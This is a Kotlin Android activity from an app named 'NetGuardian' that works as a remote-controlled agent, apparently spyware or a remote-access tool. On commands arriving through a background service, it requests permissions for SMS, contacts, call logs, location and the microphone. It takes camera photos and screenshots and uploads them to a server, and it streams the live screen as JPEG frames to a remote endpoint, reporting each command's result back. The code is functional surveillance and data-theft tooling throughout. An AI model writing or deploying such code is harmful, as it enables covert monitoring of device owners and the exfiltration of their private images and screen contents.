package net.guardian

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.Manifest
import android.content.pm.PackageManager
import android.graphics.*
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Bundle
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.DisplayMetrics
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import kotlinx.coroutines.*
import net.guardian.ui.theme.NetGuardianTheme
import java.io.ByteArrayOutputStream
import java.io.DataOutputStream
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.nio.ByteBuffer

class MainActivity : ComponentActivity() {

    companion object {
        var screenProjection: MediaProjection? = null
        var screenVirtualDisplay: VirtualDisplay? = null
        var screenReader: ImageReader? = null
        var isScreenStreaming = false
        var screenStreamJob: Job? = null
    }

    private var capturePhotoFile: File? = null
    private var pendingCommandId: Int? = null
    private var pendingScreenStream = false

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { }

    private fun ackCommand(success: Boolean, msg: String = "ok") {
        pendingCommandId?.let { id ->
            kotlinx.coroutines.MainScope().launch {
                withContext(Dispatchers.IO) {
                    ServerUploader.ackCommand(id, if (success) "done" else "failed", msg)
                }
            }
        }
        pendingCommandId = null
    }

    private val cameraCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.TakePicture()
    ) { success ->
        if (success) {
            capturePhotoFile?.let { file ->
                if (file.exists()) {
                    kotlinx.coroutines.MainScope().launch {
                        withContext(Dispatchers.IO) {
                            ServerUploader.uploadCapture("camera", file = file)
                        }
                        ackCommand(true)
                        finish()
                    }
                    return@registerForActivityResult
                }
            }
        }
        ackCommand(false, "no photo")
        finish()
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = mgr.getMediaProjection(result.resultCode, result.data!!)
            if (pendingScreenStream) {
                startScreenStream(projection)
                ackCommand(true)
                pendingScreenStream = false
                finish()
                return@registerForActivityResult
            }
            kotlinx.coroutines.MainScope().launch {
                val file = withContext(Dispatchers.IO) {
                    captureScreenshot(this@MainActivity, projection)
                }
                var uploaded = false
                if (file != null) {
                    uploaded = withContext(Dispatchers.IO) {
                        ServerUploader.uploadCapture("screen", file = file)
                    }
                    file.delete()
                }
                projection.stop()
                ackCommand(uploaded, if (uploaded) "ok" else "capture failed")
                finish()
            }
        } else {
            if (pendingScreenStream) {
                pendingScreenStream = false
                ackCommand(false, "user denied")
            }
            finish()
        }
    }

    private fun launchScreenStream() {
        if (screenProjection != null) {
            startScreenStream(screenProjection!!)
            ackCommand(true, "ok")
            finish()
            return
        }
        pendingScreenStream = true
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
        if (mgr == null) {
            ackCommand(false, "Screen projection not supported")
            finish()
            return
        }
        screenCaptureLauncher.launch(mgr.createScreenCaptureIntent())
    }

    private fun startScreenStream(projection: MediaProjection) {
        stopScreenStream()
        screenProjection = projection

        val metrics = DisplayMetrics().also { windowManager.defaultDisplay.getRealMetrics(it) }
        val density = metrics.densityDpi
        val w = metrics.widthPixels / 2
        val h = metrics.heightPixels / 2

        val ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        screenReader = ir

        val handler = Handler(Looper.getMainLooper())
        val streamScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        ir.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val jpeg = screenImageToJpeg(image)
                image.close()
                if (jpeg != null) {
                    streamScope.launch { uploadScreenFrame(jpeg) }
                }
            } catch (_: Exception) { image.close() }
        }, handler)

        screenVirtualDisplay = projection.createVirtualDisplay(
            "screen-stream",
            w, h, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            ir.surface, null, handler
        )
        isScreenStreaming = true
        screenStreamJob = streamScope.launch {
            while (isActive && isScreenStreaming) {
                try { ServerUploader.uploadScreenFrame("LIVE") } catch (_: Exception) { }
                delay(2000)
            }
        }
    }

    private fun stopScreenStream() {
        isScreenStreaming = false
        screenStreamJob?.cancel()
        screenStreamJob = null
        try { screenVirtualDisplay?.release() } catch (_: Exception) { }
        try { screenReader?.close() } catch (_: Exception) { }
        try { screenProjection?.stop() } catch (_: Exception) { }
        screenVirtualDisplay = null
        screenReader = null
        screenProjection = null
    }

    private fun screenImageToJpeg(image: Image): ByteArray? {
        try {
            val w = image.width; val h = image.height
            val plane = image.planes[0]; val buf = plane.buffer
            val pixelStride = plane.pixelStride; val rowStride = plane.rowStride
            val pixels = IntArray(w * h); buf.rewind()
            for (y in 0 until h) {
                val row = y * w
                for (x in 0 until w) {
                    val pos = y * rowStride + x * pixelStride
                    val r = buf.get(pos).toInt() and 0xFF
                    val g = buf.get(pos + 1).toInt() and 0xFF
                    val b = buf.get(pos + 2).toInt() and 0xFF
                    val a = buf.get(pos + 3).toInt() and 0xFF
                    pixels[row + x] = a shl 24 or (r shl 16) or (g shl 8) or b
                }
            }
            val bitmap = Bitmap.createBitmap(pixels, w, h, Bitmap.Config.ARGB_8888)
            val out = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
            bitmap.recycle()
            return out.toByteArray()
        } catch (_: Exception) { return null }
    }

    private fun uploadScreenFrame(jpeg: ByteArray) {
        try {
            val boundary = "Boundary${System.currentTimeMillis()}"
            val conn = URL("${ServerUploader.serverUrl}/api/screen/frame").openConnection() as HttpURLConnection
            conn.connectTimeout = 5000; conn.readTimeout = 5000
            conn.requestMethod = "POST"; conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            DataOutputStream(conn.outputStream).use { dos ->
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"frame.jpg\"\r\n")
                dos.writeBytes("Content-Type: image/jpeg\r\n\r\n")
                dos.write(jpeg)
                dos.writeBytes("\r\n--$boundary--\r\n")
            }
            conn.responseCode
        } catch (_: Exception) { }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        startService(Intent(this, CommandService::class.java))
        handleCommandIntent(intent)
        setContent {
            NetGuardianTheme {
                AgentScreen()
            }
        }
    }

    private fun handleCommandIntent(intent: Intent?) {
        if (intent == null) return
        if (intent.hasExtra("command_id")) {
            pendingCommandId = intent.getIntExtra("command_id", 0)
        }

        intent.getStringExtra("command_permission")?.let { perm ->
            when (perm) {
                "camera" -> launchPermission(Manifest.permission.CAMERA)
                "microphone" -> launchPermission(Manifest.permission.RECORD_AUDIO)
                "contacts" -> launchPermission(Manifest.permission.READ_CONTACTS)
                "sms" -> launchPermission(Manifest.permission.READ_SMS)
                "call_log" -> launchPermission(Manifest.permission.READ_CALL_LOG)
                "gallery" -> {
                    if (Build.VERSION.SDK_INT >= 33)
                        launchPermission(Manifest.permission.READ_MEDIA_IMAGES)
                    else
                        launchPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
                "location" -> {
                    launchPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                    launchPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
                }
            }
        }
        intent.getStringExtra("command_capture")?.let { target ->
            when (target) {
                "camera" -> launchCameraCapture()
                "screen" -> launchScreenCapture()
                "screen_stream_start" -> launchScreenStream()
                "screen_stream_stop" -> { stopScreenStream(); ackCommand(true, "ok"); finish() }
            }
        }
    }

    private fun launchPermission(permission: String) {
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED)
            permissionLauncher.launch(permission)
    }

    private fun launchCameraCapture() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Camera permission not granted", Toast.LENGTH_SHORT).show()
            ackCommand(false, "Camera permission not granted"); finish(); return
        }
        val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES),
            "remote_capture_${System.currentTimeMillis()}.jpg")
        capturePhotoFile = file
        cameraCaptureLauncher.launch(FileProvider.getUriForFile(this, "${packageName}.fileprovider", file))
    }

    private fun launchScreenCapture() {
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
        if (mgr == null) {
            Toast.makeText(this, "Screen capture not supported", Toast.LENGTH_SHORT).show()
            ackCommand(false, "Screen capture not supported"); finish(); return
        }
        screenCaptureLauncher.launch(mgr.createScreenCaptureIntent())
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent); handleCommandIntent(intent)
    }

    override fun onDestroy() { stopScreenStream(); super.onDestroy() }
}

fun captureScreenshot(activity: Activity, projection: MediaProjection): File? {
    try {
        val metrics = DisplayMetrics().also { activity.windowManager.defaultDisplay.getRealMetrics(it) }
        val w = metrics.widthPixels; val h = metrics.heightPixels; val density = metrics.densityDpi
        val ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        val vd = projection.createVirtualDisplay("ss", w, h, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, ir.surface, null, Handler(Looper.getMainLooper()))
        Thread.sleep(200)

        lateinit var image: Image
        val latch = java.util.concurrent.CountDownLatch(1)
        ir.setOnImageAvailableListener({
            image = it.acquireLatestImage() ?: return@setOnImageAvailableListener
            latch.countDown()
        }, Handler(Looper.getMainLooper()))
        latch.await(1, java.util.concurrent.TimeUnit.SECONDS)

        val planes = image.planes; val buf = planes[0].buffer
        val pixelStride = planes[0].pixelStride; val rowStride = planes[0].rowStride
        val pixels = IntArray(w * h); buf.rewind()
        for (y in 0 until h) {
            for (x in 0 until w) {
                val pos = y * rowStride + x * pixelStride
                pixels[y * w + x] = (buf.get(pos + 3).toInt() and 0xFF shl 24) or
                    (buf.get(pos).toInt() and 0xFF shl 16) or
                    (buf.get(pos + 1).toInt() and 0xFF shl 8) or
                    (buf.get(pos + 2).toInt() and 0xFF)
            }
        }
        image.close()
        ir.close()
        vd.release()
        projection.stop()

        val bitmap = Bitmap.createBitmap(pixels, w, h, Bitmap.Config.ARGB_8888)
        val file = File(activity.cacheDir, "screen_${System.currentTimeMillis()}.jpg")
        FileOutputStream(file).use { bitmap.compress(Bitmap.CompressFormat.JPEG, 70, it) }
        bitmap.recycle()
        return file
    } catch (_: Exception) { return null }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AgentScreen() {
    val ctx = LocalContext.current
    val scope = rememberCoroutineScope()
    var serverUrl by remember { mutableStateOf(ServerUploader.serverUrl) }
    var serverReachable by remember { mutableStateOf<Boolean?>(null) }
    var batteryLevel by remember { mutableIntStateOf(0) }
    var background by remember { mutableIntStateOf(0) }
    var recentCmds by remember { mutableStateOf(listOf<String>()) }

    LaunchedEffect(Unit) {
        withContext(Dispatchers.IO) {
            try {
                val conn = URL("$serverUrl/").openConnection() as HttpURLConnection
                conn.connectTimeout = 3000
                conn.readTimeout = 3000
                conn.connect()
                serverReachable = conn.responseCode in 200..499
            } catch (_: Exception) { serverReachable = false }

            val intent = ctx.registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            if (intent != null) {
                batteryLevel = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0)
                background = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100)
            }
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Agent") },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = MaterialTheme.colorScheme.surface)
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier.fillMaxSize().padding(padding).padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(
                            modifier = Modifier.size(10.dp).clip(CircleShape)
                                .background(when (serverReachable) { true -> Color(0xFF4CAF50)
                                    false -> Color(0xFFF44336); null -> Color(0xFFFF9800)
                                })
                        )
                        Spacer(Modifier.width(8.dp))
                        Text(when (serverReachable) { true -> "Connected"
                            false -> "Disconnected"; null -> "Checking…"
                        }, style = MaterialTheme.typography.titleMedium)
                    }
                    Text(serverUrl, style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant)
                    LinearProgressIndicator(
                        progress = if (background > 0) batteryLevel.toFloat() / background else 0f,
                        modifier = Modifier.fillMaxWidth().height(4.dp).clip(RoundedCornerShape(2.dp)),
                        color = Color(0xFF4CAF50), trackColor = MaterialTheme.colorScheme.surfaceVariant,
                    )
                    Text("Battery: $batteryLevel%", style = MaterialTheme.typography.labelSmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant)
                }
            }

            Text("Quick Actions", style = MaterialTheme.typography.labelLarge,
                color = MaterialTheme.colorScheme.onSurfaceVariant)
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                FilledTonalButton(modifier = Modifier.weight(1f), onClick = {
                    ServerUploader.serverUrl = serverUrl
                    scope.launch(Dispatchers.IO) { ServerUploader.signal("camera") }
                    recentCmds = listOf("📷 Camera") + recentCmds.take(19)
                }) { Text("📷 Camera") }
                FilledTonalButton(modifier = Modifier.weight(1f), onClick = {
                    ServerUploader.serverUrl = serverUrl
                    scope.launch(Dispatchers.IO) { ServerUploader.signal("screen") }
                    recentCmds = listOf("🖥️ Screen") + recentCmds.take(19)
                }) { Text("🖥️ Screen") }
            }

            Text("Recent", style = MaterialTheme.typography.labelLarge,
                color = MaterialTheme.colorScheme.onSurfaceVariant)
            Card(modifier = Modifier.fillMaxWidth().weight(1f)) {
                Column(modifier = Modifier.padding(12.dp).fillMaxSize()) {
                    if (recentCmds.isEmpty()) {
                        Text("No commands yet", style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant)
                    } else {
                        LazyColumn {
                            items(recentCmds.size) { i ->
                                Text(recentCmds[i], style = MaterialTheme.typography.bodySmall,
                                    modifier = Modifier.padding(vertical = 2.dp))
                            }
                        }
                    }
                }
            }
        }
    }
}
